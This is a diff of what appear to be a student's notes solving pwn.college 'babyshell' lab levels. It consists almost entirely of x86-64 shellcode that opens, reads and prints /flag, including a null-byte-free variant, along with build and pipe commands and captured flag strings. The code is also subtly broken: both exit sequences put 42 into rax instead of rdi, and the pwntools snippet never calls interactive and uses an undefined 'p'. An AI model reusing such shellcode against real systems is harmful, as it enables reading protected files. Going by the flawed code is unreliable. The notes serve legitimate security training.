@@ -92,7 +92,34 @@ _start:
     #.ascii "/flag\0"
 
 
+# python to shell
+#!/usr/bin/env python3
+from pwn import *
 
+context.arch='x86-64'
+
+my_string = "hello"
+
+my_long_string = """
+    line 1
+    line 2
+    line 3
+    """
+
+my_shellcode = asm("""
+    mov rdi, 42
+    mov ax, 60
+    syscall
+    """)
+
+with open('/tmp/sc_from_python_land', 'wb') as f:
+    f.write(my_shellcode)
+
+#p = gdb.debug('/challenge/babyshell_level1')
+
+p.send(my_shellcode)
+
+p.interactive
 
 # 1
 # s file
@@ -135,3 +162,99 @@ objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level1 
 
 pwn.college{wFFhDj-LQu_ObeVAAXX_G4tLeMm.QX3EjMscTOxUzW}
+
+# 2
+# s file
+.global _start
+.intel_syntax noprefix
+_start:
+
+    .rept 768
+    nop
+    .endr
+    # open files
+    mov rsi, 0
+    lea rdi, [rip+flag]     #load address of string into rdi -> mov rdi, "/flag"
+    mov rax, 2              #syscall 2 opens file
+    syscall
+
+    #read files
+    mov rdi, rax    #file saved in rax from above syscall
+    mov rsi, rsp    #move file to readable register
+    mov rdx, 100    # reads 100 bytes
+    mov rax, 0
+    syscall
+
+    #write files
+    mov rdi, 1      #write to stdout
+    mov rsi, rsp    #moves file to write 
+    mov rdx, rax    #reads # of bytes to write
+    mov rax, 1
+    syscall
+
+    #exit
+    mov rax, 60
+    mov rax, 42
+    syscall
+
+#\0 is null terminating for strings
+flag:
+    .ascii "/flag\0"
+
+gcc -nostdlib -o solve.elf shell2.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level2
+
+# 3
+.global _start
+.intel_syntax noprefix
+_start:
+    # open files
+    xor rsi, rsi
+    mov BYTE PTR [rsp], '/'
+    mov BYTE PTR [rsp+1], 'f'
+    mov BYTE PTR [rsp+2], 'l'
+    mov BYTE PTR [rsp+3], 'a'
+    mov BYTE PTR [rsp+4], 'g'
+    xor cl, cl 
+    mov BYTE PTR [rsp+5], cl
+    mov rdi, rsp
+    xor rax, rax
+    mov al, 2              #syscall 2 opens file -> was rax, al will result in no null bytes
+    syscall
+
+    #read files
+    mov rdi, rax    #file saved in rax from above syscall
+    mov rsi, rsp    #move file to readable register
+    xor rdx, rdx
+    mov dl, 100    # reads 100 bytes -> changed for no null bytes
+    xor rax, rax
+    syscall
+
+    #write files
+    xor rdi, rdi
+    mov dil, 1      #write to stdout
+    mov rsi, rsp    #moves file to write 
+    mov rdx, rax    #reads # of bytes to write
+    xor rax, rax
+    mov al, 1	    # could be inc rax also
+    syscall
+
+    #exit
+    xor rax, rax
+    mov al, 60
+    xor rdi, rdi
+    mov al, 42
+    syscall
+
+
+gcc -nostdlib -o solve.elf shell3.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level3
+
+pwn.college{8vDVbOV8ZUKqYqz6PXzS0HrV3IS.QX5EjMscTOxUzW}
+
